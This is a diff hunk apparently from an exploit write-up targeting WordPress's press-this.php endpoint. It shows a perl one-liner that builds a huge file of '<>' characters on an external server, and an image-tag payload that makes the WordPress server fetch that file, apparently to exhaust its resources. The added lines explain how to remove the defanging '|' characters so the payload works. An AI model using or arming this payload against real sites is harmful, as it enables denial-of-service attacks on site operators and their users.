@@ -46,3 +46,5 @@ On another server, create a textfile with the command "perl -e 'print "<>"x28000
 <|img src='http://<wp server>/wp-admin/press-this.php?u=http%3A%2F%2F<external server>%2Ffoo.txt&url-scan-submit=Scan&a=d'|>
 
 etc. etc., with "external server" being the external server address and "wp server" replaced with the word press server's address.
+
+(Be sure to take out the "|" in the "<|img" and "|>" from above to make them work)
